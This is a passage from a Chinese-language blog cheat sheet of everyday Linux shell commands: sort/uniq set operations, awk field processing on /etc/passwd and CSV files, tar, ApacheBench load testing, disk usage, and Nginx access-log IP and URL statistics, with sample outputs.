class="line"></span><br><span class="line">　　sort -u file.txt</span><br><span class="line"></span><br><span class="line">　　只显示单一行：</span><br><span class="line"></span><br><span class="line">　　uniq -u file.txt 　　</span><br><span class="line"></span><br><span class="line">　　sort file.txt | uniq -u</span><br><span class="line"></span><br><span class="line">　　统计各行在文件中出现的次数：</span><br><span class="line"></span><br><span class="line">　　sort file.txt | uniq -c</span><br><span class="line"></span><br><span class="line">　　在文件中找出重复的行：</span><br><span class="line"></span><br><span class="line">　　sort file.txt | uniq -d</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">　　利用sort和uniq求两个文件的并集，交集和差集</span><br><span class="line"></span><br><span class="line">　　并集：cat file1.txt file2.txt | sort | uniq &gt; file.txt</span><br><span class="line"></span><br><span class="line">　　交集：cat file1.txt file2.txt | sort | uniq -d &gt;file.txt</span><br><span class="line"></span><br><span class="line">　　差集：求file1.txt相对于file2.txt的差集，可先求出两者的交集temp.txt，然后在file1.txt中除去temp.txt即可。</span><br><span class="line"></span><br><span class="line">　　　　　cat file1.txt file2.txt | sort | uniq -d &gt;temp.txt</span><br><span class="line"></span><br><span class="line">　　　　　cat file1.txt temp.txt | sort | uniq -u &gt;file.txt</span><br><span class="line">sort -u 会达到和典型的 sort file.txt | uniq 模式一样的结果</span><br><span class="line">sort -t<span class="string">","</span> -k2,<span class="number">2</span> filename.csv</span><br><span class="line">egrep <span class="string">"php.*artisan"</span> 匹配php artisan</span><br><span class="line">grep <span class="string">"first_value\|second_value"</span> filename.csv</span><br></pre></td></tr></table></figure>
<h3 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">删除第一和第三列cut -d, -f <span class="number">1</span>,<span class="number">3</span> filename.csv</span><br></pre></td></tr></table></figure>
<h3 id="合并文件"><a href="#合并文件" class="headerlink" title="合并文件"></a>合并文件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># names.txt</span><br><span class="line">adam</span><br><span class="line">john</span><br><span class="line">zach</span><br><span class="line"># jobs.txt</span><br><span class="line">lawyer</span><br><span class="line">youtuber</span><br><span class="line">developer</span><br><span class="line"># Join the two into a CSV</span><br><span class="line">paste -d <span class="string">','</span> names.txt jobs.txt &gt; person_data.txt</span><br><span class="line"># Output</span><br><span class="line">adam,lawyer</span><br><span class="line">john,youtuber</span><br><span class="line">zach,developer</span><br></pre></td></tr></table></figure>
<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;print $1&#125;'</span>  /etc/passwd</span><br><span class="line"> awk -F":" '&#123;print $1,$3&#125;'  /etc/passwd                          #多了一个逗号，$1与$3使用空格分隔</span><br><span class="line"> awk -F":" '&#123;print "Username:" $1 "\t\t Uid:" $3 &#125;' /etc/passwd  #自定义输出  </span><br><span class="line"> awk -F: '&#123;print NF&#125;' /etc/passwd                                #显示每行有多少字段</span><br><span class="line"> awk -F: '&#123;print $NF&#125;' /etc/passwd                               #将每行第NF个字段的值打印出来</span><br><span class="line"> awk -F: 'NF==4 &#123;print&#125;' /etc/passwd                             #显示只有4个字段的行</span><br><span class="line"> awk -F: 'NF&gt;2&#123;print $0&#125;' /etc/passwd                            #显示每行字段数量大于2的行</span><br><span class="line"> awk -F: '&#123;print NR,NF,$NF,"\t",$0&#125;' /etc/passwd                 #依次打印行号，字段数，最后字段值，制表符，每行内容</span><br><span class="line"> awk -F: 'NR==5 || NR==6&#123;print&#125;'  /etc/passwd                    #显示第5行和第6行</span><br><span class="line"> <span class="comment">//匹配代码块</span></span><br><span class="line"> <span class="comment">//纯字符匹配   !//纯字符不匹配   ~//字段值匹配    !~//字段值不匹配   ~/a1|a2/字段值匹配a1或a2   </span></span><br><span class="line"> awk '/mysql/&#123;print $0&#125;' /etc/passwd              #三条指令结果一样</span><br><span class="line"> awk '!/mysql/&#123;print $0&#125;' /etc/passwd             #输出不匹配mysql的行</span><br><span class="line"> awk '!/mysql|mail/&#123;print&#125;' /etc/passwd           #输出不匹配mysql或mail的行</span><br><span class="line"> awk '/[2][7][7]*/&#123;print $0&#125;' /etc/passwd         #匹配包含27为数字开头的行，如27，277，2777...</span><br><span class="line"> awk -F: '$1~/mail/&#123;print $1&#125;' /etc/passwd        #$1匹配指定内容才显示</span><br><span class="line"> awk -F: <span class="string">'$1!~/mail|mysql/&#123;print $1&#125;'</span> /etc/passwd        </span><br><span class="line"></span><br><span class="line"> IF语句 必须用在&#123;&#125;中，且比较内容用()扩起来</span><br><span class="line"> awk -F: <span class="string">'&#123;if($1~/mail/) print $1&#125;'</span> /etc/passwd                                     </span><br><span class="line"> awk -F: <span class="string">'&#123;if($1~/mail/) &#123;print $1&#125;&#125;'</span>  /etc/passwd                              </span><br><span class="line"> awk -F: '&#123;if($1~/mail/) &#123;print $1&#125; else &#123;print $2&#125;&#125;' /etc/passwd  #if...else...</span><br><span class="line"></span><br><span class="line"> 条件表达式 ==   !=   &gt;   &gt;=  </span><br><span class="line"> awk -F<span class="string">":"</span> <span class="string">'&#123;if($1=="mysql") print $3&#125;'</span> /etc/passwd          <span class="comment">//与上面相同 </span></span><br><span class="line"> awk -F<span class="string">":"</span> <span class="string">'$1!="mysql"&#123;print $3&#125;'</span> /etc/passwd               <span class="comment">//不等于</span></span><br><span class="line"> awk -F<span class="string">":"</span> <span class="string">'$3&gt;1000&#123;print $3&#125;'</span> /etc/passwd                   <span class="comment">//大于</span></span><br><span class="line"></span><br><span class="line"> 逻辑运算符 &amp;&amp;　|| </span><br><span class="line"> awk -F: <span class="string">'&#123;if($1~/mail/ &amp;&amp; $3&gt;8) print &#125;'</span> /etc/passwd</span><br><span class="line"> awk -F: <span class="string">'&#123;if($1~/mail/ || $3&gt;1000) print &#125;'</span> /etc/passwd </span><br><span class="line"> 删除重复行</span><br><span class="line"> </span><br><span class="line"> $ awk <span class="string">'!($0 in array) &#123; array[$0]; print&#125;'</span> temp</span><br><span class="line"> 打印/etc/passwd中所有包含同样的uid和gid的行</span><br><span class="line"> </span><br><span class="line"> $ awk -F <span class="string">':'</span> <span class="string">'$3=$4'</span> /etc/passwd</span><br><span class="line"> 打印文件中的指定部分的字段</span><br><span class="line"> </span><br><span class="line"> $ awk <span class="string">'&#123;print $2,$5;&#125;'</span> employee.txt</span><br><span class="line"> 比较的时候忽略空白符</span><br><span class="line"> </span><br><span class="line"> $ diff -w name_list.txt name_list_new.txt</span><br><span class="line"> 下载文件中列出的所有url对应的页面</span><br><span class="line"> </span><br><span class="line"> $ cat url-list.txt | xargs wget –c</span><br><span class="line"> #替代grep</span><br><span class="line"> awk <span class="string">'/word/'</span> filename.csv</span><br><span class="line"> 对于所有带我们指定单词 word 的行，awk 打印第三和第四列，用 tab 分隔。-F, 用于指定切分时的列分隔符为逗号。</span><br><span class="line"> awk -F, <span class="string">'/word/ &#123; print $3 "\t" $4 &#125;'</span> filename.csv</span><br><span class="line"> 要获取文件中的第 <span class="number">53</span> 条记录</span><br><span class="line"> awk -F, <span class="string">'NR == 53'</span> filename.csv</span><br><span class="line"> 打印第一列等于给定字符串的行的行号和列</span><br><span class="line"> awk -F, <span class="string">' $1 == "string" &#123; print NR, $0 &#125; '</span> filename.csv</span><br><span class="line"> awk -F, <span class="string">' $3 &gt;= 2005 &amp;&amp; $5 &lt;= 1000 &#123; print NR, $0 &#125; '</span> filename.csv</span><br><span class="line"> 求出第三列的总和</span><br><span class="line"> awk -F, <span class="string">'&#123; x+=$3 &#125; END &#123; print x &#125;'</span> filename.csv</span><br><span class="line"> 组合多个 CSV 文件，忽略标题，然后在最后附加它</span><br><span class="line"> awk <span class="string">'FNR==1 &amp;&amp; NR!=1&#123;next;&#125;&#123;print&#125;'</span> *.csv &gt; final_file.csv</span><br><span class="line"> 内置函数 gsub() 替换多个值</span><br><span class="line"> awk <span class="string">'&#123;gsub(/scarlet|ruby|puce/, "red"); print&#125;'</span></span><br><span class="line"> 打印出现了两次的行</span><br><span class="line"> awk -F, <span class="string">'++seen[$0] == 2'</span> filename.csv</span><br><span class="line"> 获取文件的行列数：</span><br><span class="line"> awk -F, <span class="string">'END &#123; print NF, NR &#125;'</span> filename.csv</span><br><span class="line"> # Prettier version</span><br><span class="line"> awk -F, <span class="string">'BEGIN &#123; print "COLUMNS", "ROWS" &#125;; END &#123; print NF, NR &#125;'</span> filename.csv</span><br><span class="line">根据第一列去重，相同的保留第二列值最大的那个https:<span class="comment">//segmentfault.com/q/1010000000665713</span></span><br><span class="line">fdf     <span class="number">284</span> </span><br><span class="line">asd     <span class="number">112</span></span><br><span class="line">adf     <span class="number">146</span></span><br><span class="line">csb     <span class="number">513</span></span><br><span class="line">dfg     <span class="number">576</span></span><br><span class="line">asd     <span class="number">346</span></span><br><span class="line">adf     <span class="number">263</span></span><br><span class="line">csb     <span class="number">092</span></span><br><span class="line">dfg     <span class="number">547</span></span><br><span class="line">[root@VM_0_14_centos ~]# cat awk.txt | sort -rnk2 | awk '&#123;if (!keys[$1]) print $0; keys[$1] = 1;&#125;'</span><br><span class="line">dfg     <span class="number">576</span></span><br><span class="line">csb     <span class="number">513</span></span><br><span class="line">asd     <span class="number">346</span></span><br><span class="line">fdf     <span class="number">284</span></span><br><span class="line">adf     <span class="number">263</span></span><br><span class="line">先按第二列数字大小逆序，然后再按第一列去重，这样就能得到第二列最大的非重复行数据。</span><br><span class="line">[root@VM_0_14_centos ~]# sort -rnk2,2 awk.txt |sort -uk1,1</span><br><span class="line"></span><br><span class="line">adf     <span class="number">263</span></span><br><span class="line">asd     <span class="number">346</span></span><br><span class="line">csb     <span class="number">513</span></span><br><span class="line">dfg     <span class="number">576</span></span><br><span class="line">fdf     <span class="number">284</span></span><br><span class="line">第一列等于 something 的那些行，求出第三列值的总和</span><br><span class="line">awk -F, <span class="string">'$1 == "something" &#123; x+=$3 &#125; END &#123; print x &#125;'</span> filename.csv</span><br></pre></td></tr></table></figure>
<h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ bind -p</span><br><span class="line"><span class="string">"\C-g"</span>: abort</span><br><span class="line"><span class="string">"\C-x\C-g"</span>: abort</span><br><span class="line"><span class="string">"\e\C-g"</span>: abort</span><br><span class="line"><span class="string">"\C-j"</span>: accept-line</span><br><span class="line">查找所有使用了Control键的绑定https:<span class="comment">//gywbd.github.io/posts/2014/11/linux-keybindings.html</span></span><br><span class="line">$ bind -p | grep <span class="string">'\\c'</span></span><br></pre></td></tr></table></figure>
<h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">创建一个新的tar文件</span><br><span class="line"></span><br><span class="line">$ tar cvf archive_name.tar dirname/</span><br><span class="line">解压tar文件</span><br><span class="line"></span><br><span class="line">$ tar xvf archive_name.tar</span><br><span class="line">查看tar文件</span><br><span class="line"></span><br><span class="line">$ tar tvf archive_name.tar</span><br></pre></td></tr></table></figure>
<h3 id="测试并发"><a href="#测试并发" class="headerlink" title="测试并发"></a>测试并发</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ab -n <span class="number">100</span> -c <span class="number">10</span> -l http:<span class="comment">//www.your_site.com</span></span><br><span class="line">-n number 总的请求数</span><br><span class="line">-c concurrency 并发数 </span><br><span class="line">-l 表示当某个请求的回复长度不与第一个请求的回复长度一致时，不把它作为失败的请求</span><br><span class="line">POST方法：https:<span class="comment">//shuwoom.com/?p=1542</span></span><br><span class="line"></span><br><span class="line">ab -n <span class="number">100</span> -c <span class="number">10</span> -p post.txt http:<span class="comment">//xxx/test.php</span></span><br><span class="line">post.txt里面是参数，如data=&#123;<span class="string">"name"</span>:<span class="string">"wgc"</span>&#125;，但是要url编码以后的参数</span><br></pre></td></tr></table></figure>
<h3 id="查看当前目录下各个文件或文件夹的大小"><a href="#查看当前目录下各个文件或文件夹的大小" class="headerlink" title="查看当前目录下各个文件或文件夹的大小"></a>查看当前目录下各个文件或文件夹的大小</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_14_centos ~]# du -h --max-depth=1 .</span><br><span class="line"><span class="number">7.5</span>M    ./.config</span><br><span class="line"><span class="number">5.8</span>M    ./imgbed-project</span><br><span class="line"><span class="number">1.7</span>M    ./Chatroom</span><br><span class="line"><span class="number">8.0</span>K    ./.httpie</span><br><span class="line"><span class="number">20</span>K     ./.ssh</span><br><span class="line"><span class="number">2.7</span>M    ./lnmp-docker</span><br><span class="line"><span class="number">101</span>M    ./daily-signer</span><br><span class="line"><span class="number">708</span>K    ./pick<span class="number">-1.9</span><span class="number">.0</span></span><br><span class="line"><span class="number">32</span>M     ./gaga</span><br><span class="line"><span class="number">688</span>K    ./.acme.sh</span><br><span class="line"><span class="number">1.9</span>M    ./dockser-server</span><br><span class="line"><span class="number">3.4</span>M    ./shadowsocksr</span><br></pre></td></tr></table></figure>
<h3 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a>查找字符串</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find .<span class="comment">/*|xargs grep debug</span></span><br><span class="line"><span class="comment">#https://github.com/BurntSushi/ripgrep/</span></span><br><span class="line"><span class="comment">[root@VM_0_14_centos ~]# rg 'redis'</span></span><br><span class="line"><span class="comment">imgbed-project/LICENSE</span></span><br><span class="line"><span class="comment">627:free software which everyone can redistribute and change under these terms.</span></span><br><span class="line"><span class="comment">637:    This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">657:    This is free software, and you are welcome to redistribute it</span></span><br></pre></td></tr></table></figure>
<h3 id="Nginx-日志统计-ip-访问数"><a href="#Nginx-日志统计-ip-访问数" class="headerlink" title="Nginx 日志统计 ip 访问数"></a>Nginx 日志统计 ip 访问数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">切割日志</span><br><span class="line"></span><br><span class="line">查找<span class="number">7</span>月<span class="number">17</span>日访问log导出到<span class="number">17.</span>log文件中：</span><br><span class="line"></span><br><span class="line">cat gelin_web_access.log | egrep <span class="string">"17/Jul/2017"</span> | sed  -n <span class="string">'/00:00:00/,/23:59:59/p'</span> &gt; <span class="regexp">/tmp/</span><span class="number">17.</span>log</span><br><span class="line">查看访问量前<span class="number">10</span>的IP</span><br><span class="line"></span><br><span class="line">awk <span class="string">'&#123;print $1&#125;'</span> <span class="number">17.</span>log | sort | uniq -c | sort -nr | head -n <span class="number">10</span> </span><br><span class="line">查看访问前<span class="number">10</span>的URL</span><br><span class="line"></span><br><span class="line">awk <span class="string">'&#123;print $11&#125;'</span> gelin_web_access.log | sort | uniq -c | sort -nr | head -n <span class="number">10</span></span><br><span class="line">查询访问最频繁的URL</span><br><span class="line"></span><br><span class="line">awk <span class="string">'&#123;print $7&#125;'</span> gelin_web_access.log | sort | uniq -c | sort -n -k <span class="number">1</span> -r | more</span><br><span class="line">查询访问最频繁的IP</span><br><span class="line"></span><br><span class="line">awk <span class="string">'&#123;print $1&#125;'</span> gelin_web_access.log | sort | uniq -c | sort -n -k <span class="number">1</span> -r | more</span><br><span class="line">根据访问IP统计UV</span><br><span class="line"></span><br><span class="line">awk <span class="string">'&#123;print $1&#125;'</span> gelin_web_access.log | sort | uniq -c | wc -l</span><br><span class="line">统计访问URL统计PV</span><br><span class="line"></span><br><span class="line">awk <span class="string">'&#123;print $7&#125;'</span> gelin_web_access.log | wc -l</span><br><span class="line">根据时间段统计查看日志</span><br><span class="line"></span><br><span class="line">cat gelin_web_access.log | sed -n <span class="string">'/17\/Jul\/2017:12/,/17\/Jul\/2017:13/p'</span> | more</span><br><span class="line">[root@VM_0_14_centos ~]# cat /var/log/nginx/access.log|more</span><br><span class="line"><span class="number">120.132</span><span class="number">.3</span><span class="number">.65</span> - - [<span class="number">21</span>/Dec/<span class="number">2018</span>:<span class="number">06</span>:<span class="number">28</span>:<span class="number">57</span> +<span class="number">0800</span>] <span class="string">"GET http://www.qq.com/404/search_children.js HTTP/1.1"</span> <span class="number">404</span> <span class="number">3650</span> <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36"</span> <span class="string">"-"</span></span><br><span class="line"><span class="number">120.132</span><span class="number">.3</span><span class="number">.65</span> - - [<span class="number">21</span>/Dec/<span class="number">2018</span>:<span class="number">06</span>:<span class="number">28</span>:<span class="number">57</span> +<span class="number">0800</span>] <span class="string">"\x04\x01\x00PpTi4\x00"</span> <span class="number">400</span> <span class="number">173</span> <span class="string">"-"</span> <span class="string">"-"</span> <span class="string">"-"</span></span><br><span class="line"><span class="number">120.132</span><span class="number">.3</span><span class="number">.65</span> - - [<span class="number">21</span>/Dec/<span class="number">2018</span>:<span class="number">06</span>:<span class="number">28</span>:<span class="number">57</span> +<span class="number">0800</span>] <span class="string">"\x05\x01\x00"</span> <span class="number">400</span> <span class="number">173</span> <span class="string">"-"</span> <span class="string">"-"</span> <span class="string">"-"</span></span><br><span class="line"><span class="number">58.150</span><span class="number">.60</span><span class="number">.162</span> - manager [<span class="number">21</span>/Dec/<span class="number">2018</span>:<span class="number">08</span>:<span class="number">08</span>:<span class="number">21</span> +<span class="number">0800</span>] <span class="string">"POST /WEB_VMS/LEVEL15/ HTTP/1.1"</span> <span class="number">404</span> <span class="number">3650</span> <span class="string">"-"</span> <span class="string">"-"</span> <span class="string">"-"</span></span><br><span class="line"><span class="number">95.213</span><span class="number">.177</span><span class="number">.123</span> - - [<span class="number">21</span>/Dec/<span class="number">2018</span>:<span class="number">08</span>:<span class="number">36</span>:<span class="number">15</span> +<span class="number">0800</span>] <span class="string">"CONNECT check.proxyradar.com:80 HTTP/1.1"</span> <span class="number">400</span> <span class="number">173</span> <span class="string">"-"</span> <span class="string">"-"</span> <span class="string">"-"</span></span><br><span class="line"><span class="number">60.191</span><span class="number">.52</span><span class="number">.254</span> - - [<span class="number">21</span>/Dec/<span class="number">2018</span>:<span class="number">09</span>:<span class="number">35</span>:<span class="number">18</span> +<span class="number">0800</span>] <span class="string">"HEAD http://112.124.42.80:63435/ HTTP/1.1"</span> <span class="number">200</span> <span class="number">0</span> <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"</span> <span class="string">"-"</span></span><br><span class="line"><span class="number">80.82</span><span class="number">.70</span><span class="number">.187</span> - - [<span class="number">21</span>/Dec/<span class="number">2018</span>:<span class="number">09</span>:<span class="number">47</span>:<span class="number">37</span> +<span class="number">0800</span>] <span class="string">"GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1"</span> <span class="number">404</span> <span class="number">3650</span> <span class="string">"-"</span> <span class="string">"Mozilla"</span> <span class="string">"-"</span></span><br><span class="line"><span class="number">139.162</span><span class="number">.81</span><span class="number">.62</span> - - [<span class="number">21</span>/Dec/<span class="number">2018</span>:<span class="number">10</span>:<span class="number">33</span>:<span class="number">03</span> +<span class="number">0800</span>] <span class="string">"GET http://clientapi.ipip.net/echo.php?info=1234567890 HTTP/1.1"</span> <span class="number">404</span> <span class="number">3650</span> <span class="string">"-"</span> <span class="string">"Go-http-client/1.1"</span> <span class="string">"-"</span></span><br><span class="line">[root@VM_0_14_centos ~]# cat /var/log/nginx/access.log|awk '&#123;print $1&#125;'|sort|uniq -c|sort -nrk1</span><br><span class="line">      <span class="number">3</span> <span class="number">120.132</span><span class="number">.3</span><span class="number">.65</span></span><br><span class="line">      <span class="number">1</span> <span class="number">95.213</span><span class="number">.177</span><span class="number">.123</span></span><br><span class="line">      <span class="number">1</span> <span class="number">80.82</span><span class="number">.78</span><span class="number">.50</span></span><br><span class="line">      <span class="number">1</span> <span class="number">80.82</span><span class="number">.70</span><span class="number">.187</span></span><br><span class="line">      <span class="number">1</span> <span class="number">60.191</span><span class="number">.52</span><span class="number">.254</span></span><br><span class="line">      <span class="number">1</span> <span class="number">58.150</span><span class="number">.60</span><span class="number">.162</span></span><br><span class="line">      <span class="number">1</span> <span class="number">139.162</span><span class="number">.81</span><span class="number">.62</span></span><br><span class="line">at /<span class="keyword">var</span>/log/nginx/access.log|awk <span class="string">'&#123;ipArr[$1]++&#125; END&#123;for( item in ipArr) print item,ipArr[item]&#125;'</span> | sort -r -k</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1.</span>根据访问IP统计UV</span><br><span class="line">awk <span class="string">'&#123;print $1&#125;'</span> access.log|sort | uniq -c |wc -l</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>统计访问URL统计PV</span><br><span class="line">awk <span class="string">'&#123;print $7&#125;'</span> access.log|wc -l</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>查询访问最频繁的URL</span><br><span class="line">awk <span class="string">'&#123;print $7&#125;'</span> access.log|sort | uniq -c |sort -n -k <span class="number">1</span> -r|more</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>查询访问最频繁的IP</span><br><span class="line">awk <span class="string">'&#123;print $1&#125;'</span> access.log|sort | uniq -c |sort -n -k <span class="number">1</span> -r|more</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>根据时间段统计查看日志</span><br><span class="line">cat access.log| sed -n <span class="string">'/14\/Mar\/2015:21/,/14\/Mar\/2015:22/p'</span>|more</span><br></pre></td></tr></table></figure>
<h3 id="文件比较（交集、差集）"><a href="#文件比较（交集、差集）" class="headerlink" title="文件比较（交集、差集）"></a>文件比较（交集、差集）</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">交集（打印两个文件相同的行）</span><br><span class="line">[root@VM_0_14_centos ~]# cat aaa.txt</span><br><span class="line">aaa</span><br><span class="line">bbb</span><br><span class="line">ccc</span><br><span class="line">ddd</span><br><span class="line">eee</span><br><span class="line"><span class="number">111</span></span><br><span class="line"><span class="number">222</span></span><br><span class="line">[root@VM_0_14_centos ~]# cat bbb.txt</span><br><span class="line">bbb</span><br><span class="line">ccc</span><br><span class="line">aaa</span><br><span class="line">hhh</span><br><span class="line">ttt</span><br><span class="line">jjj</span><br><span class="line">[root@VM_0_14_centos ~]# comm -12 &lt;(sort aaa.txt) &lt;(sort bbb.txt)</span><br><span class="line">aaa</span><br><span class="line">bbb</span><br><span class="line">ccc</span><br><span class="line">求差（打印两个文件中不相同的行）</span><br><span class="line">[root@VM_0_14_centos ~]# comm -3 &lt;(sort aaa.txt) &lt;(sort bbb.txt)</span><br><span class="line"><span class="number">111</span></span><br><span class="line"><span class="number">222</span></span><br><span class="line">ddd</span><br><span class="line">eee</span><br><span class="line">        hhh</span><br><span class="line">        jjj</span><br><span class="line">        ttt</span><br><span class="line">[root@VM_0_14_centos ~]# comm -3 &lt;(sort aaa.txt) &lt;(sort bbb.txt)|sed 's/^\t//' </span><br><span class="line"><span class="number">111</span>                                                                            </span><br><span class="line"><span class="number">222</span>                                                                            </span><br><span class="line">ddd                                                                            </span><br><span class="line">eee                                                                            </span><br><span class="line">hhh                                                                            </span><br><span class="line">jjj                                                                            </span><br><span class="line">ttt     </span><br><span class="line">aaa.txt的差集</span><br><span class="line">[root@VM_0_14_centos ~]# comm -23 &lt;(sort aaa.txt) &lt;(sort bbb.txt)</span><br><span class="line"><span class="number">111</span></span><br><span class="line"><span class="number">222</span></span><br><span class="line">ddd</span><br><span class="line">eee</span><br><span class="line">bbb.txt的差集</span><br><span class="line">[root@VM_0_14_centos ~]# comm -13 &lt;(sort aaa.txt) &lt;(sort bbb.txt)</span><br><span class="line">hhh</span><br><span class="line">jjj</span><br><span 